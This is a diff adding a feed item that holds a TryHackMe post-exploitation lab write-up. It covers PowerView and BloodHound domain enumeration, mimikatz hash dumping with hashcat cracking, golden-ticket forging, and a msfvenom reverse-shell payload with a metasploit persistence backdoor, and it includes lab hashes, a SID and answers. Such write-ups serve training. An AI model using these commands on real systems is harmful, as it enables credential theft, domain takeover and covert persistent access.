@@ -12,6 +12,1160 @@
     </author>
     
       <item>
+        <title>TryHackMe - Post-Exploitation Basics</title>
+        <description>&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/postexploit&quot;&gt;https://tryhackme.com/room/postexploit&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The basics of post-exploitation and maintaining access with mimikatz, bloodhound, powerview and msfvenom&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-1---introduction&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 1 - Introduction&lt;/h2&gt;
+
+&lt;p&gt;This room will cover all of the basics of post-exploitation; we’ll talk everything from post-exploitation enumeration with powerview and bloodhound, dumping hashes and golden ticket attacks with mimikatz, basic information gathering using windows server tools and logs, and then we will wrap up this room talking about the basics of maintaining access with the persistence metaploit module and creating a backdoor into the machine to get an instant meterpreter shell if the system is ever shutdown or reset.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-2---enumeration-w-powerview&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 2 - Enumeration w/ Powerview&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Enumeration cheat sheet: &lt;a href=&quot;https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993&quot;&gt;https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powershell -ep bypass&lt;/code&gt; start powershell &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-ep bypass&lt;/code&gt; bypasses the execution policy of powershell allowing us to run scripts easily&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;. .\Downloads\PowerView.ps1&lt;/code&gt; start PowerView&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Get-NetUser | select cn&lt;/code&gt; - enumerate domain users&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&amp;gt; Get-NetUser | &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;cn 
+cn                  
+&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;                                    
+Administrator                         
+Guest                                 
+krbtgt                                
+Machine-1                             
+Admin2                                
+Machine-2                             
+SQL Service                           
+POST&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;P0W3RV13W_FTW&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;                   
+sshd          
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Get-NetGroup -GroupName *admin*&lt;/code&gt; - enumerate domain groups&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&amp;gt; Get-NetGroup &lt;span class=&quot;nt&quot;&gt;-GroupName&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;admin&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 
+Administrators 
+Hyper-V Administrators         
+Storage Replica Administrators 
+Schema Admins                  
+Enterprise Admins              
+Domain Admins                  
+Key Admins                            
+Enterprise Key Admins                 
+DnsAdmins                             
+PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-ShareFinder&lt;/code&gt; Find Shares&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&amp;gt; Invoke-ShareFinder
+&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Domain-Controller.CONTROLLER.local&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;DMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;    - Remote Admin 
+&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Domain-Controller.CONTROLLER.local&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;        - Default share
+&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Domain-Controller.CONTROLLER.local&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;PC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;      - Remote IPC
+&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Domain-Controller.CONTROLLER.local&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;ETLOGON   - Logon server share
+&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Domain-Controller.CONTROLLER.local&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;hare      -
+&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Domain-Controller.CONTROLLER.local&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSVOL     - Logon server share
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Get-NetComputer -fulldata | select operatingsystem&lt;/code&gt; Find Operating Systems&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&amp;gt; Get-NetComputer &lt;span class=&quot;nt&quot;&gt;-fulldata&lt;/span&gt; | &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;operatingsystem
+
+operatingsystem
+&lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;
+Windows Server 2019 Standard
+Windows 10 Enterprise Evaluation
+Windows 10 Enterprise Evaluation
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;answer-the-questions-below&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the shared folder that is not set by default?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;share&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What operating system is running inside of the network besides Windows Server 2019?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Windows 10 nterprise Evaluation&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;I’ve hidden a flag inside of the users find it&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;POST{P0W3RV13W_FTW}&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-3---enumeration-w-bloodhound&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 3 - Enumeration w/ Bloodhound&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Bloodhound is a graphical interface that allows you to visually map out the network. This tool along with SharpHound which similar to PowerView takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo neo4j console&lt;/code&gt; - default credentials = neo4j:neo4j&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;-getting-loot-w-sharphound&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt; Getting Loot w/ Sharphound&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powershell -ep bypass&lt;/code&gt; allows us to run scripts&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;. .\SharpHound.ps1&lt;/code&gt; - start sharphound&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip&lt;/code&gt; - loot everything&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scp Administrator@10.10.70.220:/users/Administrator/Downloads/20220621140925_loot.zip ~/thm/postexploit&lt;/code&gt; - scp over to kali&lt;/li&gt;
+  &lt;li&gt;run bloodhound on kali and import (drag and drop if import doesnt work)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h5 id=&quot;answer-the-questions-below-1&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
+
+&lt;p&gt;&lt;strong&gt;What service is also a domain admin&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;sqlservice&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What two users are Kerberoastable?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;sqlservice krbtgt&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-4---dumping-hashes-w-mimikatz&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 4 - Dumping hashes w/ mimikatz&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mimikatz.exe&lt;/code&gt; run mimikatz&lt;/li&gt;
+  &lt;li&gt;check privilege need 20 OK &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;privilege::debug&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsadump::lsa /patch&lt;/code&gt; hash dump&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz &lt;span class=&quot;c&quot;&gt;# lsadump::lsa /patch &lt;/span&gt;
+Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 
+                                                              
+RID  : 000001f4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;500&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                         
+User : Administrator                                          
+LM   :
+NTLM : 2777b7fec870e04dda00cd7260f7bee6
+
+RID  : 000001f5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;501&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+User : Guest
+LM   :
+NTLM :
+
+RID  : 000001f6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;502&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+User : krbtgt
+LM   :
+NTLM : 5508500012cc005cf7082a9a89ebdfdf
+
+RID  : 0000044f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1103&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+User : Machine1
+LM   :
+NTLM : 64f12cddaa88057e06a81b54e73b949b
+
+RID  : 00000451 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1105&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+User : Admin2
+LM   :
+NTLM : 2b576acbe6bcfda7294d6bd18041b8fe
+
+RID  : 00000452 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1106&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+User : Machine2
+LM   :
+NTLM : c39f2beb3d2ec06a62cb887fb391dee0
+
+RID  : 00000453 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1107&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+User : SQLService
+LM   :
+NTLM : f4ab68f27303bcb4024650d8fc5f973a
+
+RID  : 00000454 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1108&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+User : POST
+LM   :
+NTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2
+
+RID  : 00000457 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1111&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+User : sshd
+LM   :
+NTLM : 2777b7fec870e04dda00cd7260f7bee6
+
+RID  : 000003e8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+User : DOMAIN-CONTROLL&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+LM   :
+NTLM : 3b86e8b40884378eeb3d988ed098ebfb
+
+RID  : 00000455 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1109&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+User : DESKTOP-2&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+LM   :
+NTLM : 3c2d4759eb9884d7a935fe71a8e0f54c
+
+RID  : 00000456 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1110&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+User : DESKTOP-1&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+LM   :
+NTLM : 7d33346eeb11a4f12a6c201faaa0d89a
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/seclists/Passwords/rockyou.txt&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat -m 1000 c39f2beb3d2ec06a62cb887fb391dee0 /usr/share/seclists/Passwords/rockyou.txt&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h5 id=&quot;answer-the-questions-below-2&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
+
+&lt;p&gt;&lt;strong&gt;what is the Machine1 Password?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;64f12cddaa88057e06a81b54e73b949b:Password1&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the Machine2 Hash?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;c39f2beb3d2ec06a62cb887fb391dee0:Password2&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-5---golden-ticket-attacks-w-mimikatz&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 5 - Golden Ticket Attacks w/ mimikatz&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We will first dump the hash and sid of the krbtgt user then create a golden ticket and use that golden ticket to open up a new command prompt allowing us to access any machine on the network.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;dump the krbtgt hash and security identifier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsadump::lsa /inject /name:krbtgt&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz &lt;span class=&quot;c&quot;&gt;# lsadump::lsa /inject /name:krbtgt &lt;/span&gt;
+Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 
+
+RID  : 000001f6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;502&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+User : krbtgt
+
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Primary
+    NTLM : 5508500012cc005cf7082a9a89ebdfdf
+    LM   :
+  Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf
+    ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf
+    lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c
+
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; WDigest
+    01  49a8de3b6c7ae1ddf36aa868e68cd9ea
+    02  7902703149b131c57e5253fd9ea710d0
+    03  71288a6388fb28088a434d3705cc6f2a
+    04  49a8de3b6c7ae1ddf36aa868e68cd9ea
+    05  7902703149b131c57e5253fd9ea710d0
+    06  df5ad3cc1ff643663d85dabc81432a81 
+    07  49a8de3b6c7ae1ddf36aa868e68cd9ea
+    08  a489809bd0f8e525f450fac01ea2054b
+    09  19e54fd00868c3b0b35b5e0926934c99
+    10  4462ea84c5537142029ea1b354cd25fa
+    11  6773fcbf03fd29e51720f2c5087cb81c
+    12  19e54fd00868c3b0b35b5e0926934c99
+    13  52902abbeec1f1d3b46a7bd5adab3b57
+    14  6773fcbf03fd29e51720f2c5087cb81c
+    15  8f2593c344922717d05d537487a1336d
+    16  49c009813995b032cc1f1a181eaadee4
+    17  8552f561e937ad7c13a0dca4e9b0b25a 
+    18  cc18f1d9a1f4d28b58a063f69fa54f27
+    19  12ae8a0629634a31aa63d6f422a14953
+    20  b6392b0471c53dd2379dcc570816ba10
+    21  7ab113cb39aa4be369710f6926b68094
+    22  7ab113cb39aa4be369710f6926b68094
+    23  e38f8bc728b21b85602231dba189c5be
+    24  4700657dde6382cd7b990fb042b00f9e
+    25  8f46d9db219cbd64fb61ba4fdb1c9ba7
+    26  36b6a21f031bf361ce38d4d8ad39ee0f
+    27  e69385ee50f9d3e105f50c61c53e718e
+    28  ca006400aefe845da46b137b5b50f371 
+    29  15a607251e3a2973a843e09c008c32e3
+
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Kerberos
+    Default Salt : CONTROLLER.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 64ef5d43922f3b5d
+
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Kerberos-Newer-Keys
+    Default Salt : CONTROLLER.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 8e544cabf340db750cef9f5db7e1a2f97e465dffbd5a2dc6424
+6bda3c75fe53d
+      aes128_hmac       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 7eb35bddd529c0614e5ad9db4c798066
+      des_cbc_md5       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 64ef5d43922f3b5d
+
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; NTLM-Strong-NTOWF
+    Random Value : 666caaaaf30081f30211bd7fa445fec4 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;we need the SID which is (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;S-1-5-21-849420856-2351964222-986696166&lt;/code&gt;) the user which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;krbtgt&lt;/code&gt; and the NTLM hash which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5508500012cc005cf7082a9a89ebdfdf&lt;/code&gt; also our administrator id which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;500&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;put everything toget for the golden ticket: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf id:500&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz &lt;span class=&quot;c&quot;&gt;# kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-&lt;/span&gt;
+21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;:500   
+User      : Administrator 
+Domain    : controller.local &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CONTROLLER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SID       : S-1-5-21-849420856-2351964222-986696166
+User Id   : 500
+Groups Id : &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;513 512 520 518 519
+ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt
+Lifetime  : 6/21/2022 5:46:43 PM &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 6/18/2032 5:46:43 PM &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 6/18/2032 5:46:43 PM      
+-&amp;gt; Ticket : ticket.kirbi
+
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PAC generated
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PAC signed
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; EncTicketPart generated
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; EncTicketPart encrypted
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; KrbCred generated
+
+Final Ticket Saved to file &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;use-golden-ticket-to-access-other-machines&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Use Golden Ticket to Access Other Machines&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;misc::cmd&lt;/code&gt; to open a new command promt with elevated privileges to all machines&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz &lt;span class=&quot;c&quot;&gt;# misc::cmd &lt;/span&gt;
+Patch OK &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;cmd.exe&apos;&lt;/span&gt; from &lt;span class=&quot;s1&quot;&gt;&apos;DisableCMD&apos;&lt;/span&gt; to &lt;span class=&quot;s1&quot;&gt;&apos;KiwiAndCMD&apos;&lt;/span&gt; @ 00007FF7676543B8 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Access other machines from command promt!&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-6---enumeration-w-server-manager&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 6 - Enumeration w/ Server Manager&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;the main tabs that will be most interesting are the tools and manage tabs the tools tab is where you will find most of your information such as users, groups, trusts, computers.&lt;/li&gt;
+  &lt;li&gt;The manage tab will allow you to add roles and features however this will probably get picked up by a systems admin relatively quick.&lt;/li&gt;
+  &lt;li&gt;Dont worry about the AD CS, AD DS, DNS, or File and Storage Services these are setup for exploitation of the active directory and dont have much use for post-exploitation&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Navigate to the tools tab top right and select the Active Directory Users and Computers. This will pull up a list of all users on the domain as well as some other useful tabs to use such as groups and computers. Some sys admins dont realize that you as an attacker can see the descriptions of user accounts so they may set the service accounts passwords inside of the description look into the description and find what the SQL Service password is&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h5 id=&quot;answer-the-questions-below-3&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
+
+&lt;p&gt;What tool allows to view the event logs?&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;event viewer&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;What is the SQL Service password&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;MYpassword123#&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-7---maintaining-access&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 7 - Maintaining Access&lt;/h2&gt;
+
+&lt;p&gt;We will be covering a fairly simple way of maintaining access by first setting up a meterpreter shell and then using the persistence metasploit module allowing us to create a backdoor service in the system that will give us an instant meterpreter shell if the machine is ever shutdown or reset.&lt;/p&gt;
+
+&lt;p&gt;There are also other ways of maintaining access such as advanced backdoors and rootkits however those are out of scope for this room.&lt;/p&gt;
+
+&lt;p&gt;This will require a little more manual setup than the other tasks so it is recommended to have previous knowledge of msfvenom and metasploit.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Generate payload with msfvenom &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.127.225 LPORT=6669 -f exe -o shell.exe&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Transfer payload to target &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scp shell.exe Administrator@10.10.114.62:/Users/Administrator/Downloads&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;in msfconsole &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use exploit/multi/handler&lt;/code&gt;, configure payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set payload windows/meterpreter/reverse_tcp&lt;/code&gt; and set options to listen on port 6669 and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;execute the binary on the target windows machine which should connect us with meterpreter shell.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;background&lt;/code&gt; meterpreter shell to run persistance module.&lt;/li&gt;
+  &lt;li&gt;setup persistance module &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use exploit/windows/local/persistance&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set session 1&lt;/code&gt; then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit/multi/handler&lt;/code&gt; and setting the payload to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;windows/meterpreter/reverse_tcp&lt;/code&gt; allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.&lt;/p&gt;
+
+&lt;h2 id=&quot;task-8---conclustion&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 8 - Conclustion&lt;/h2&gt;
+
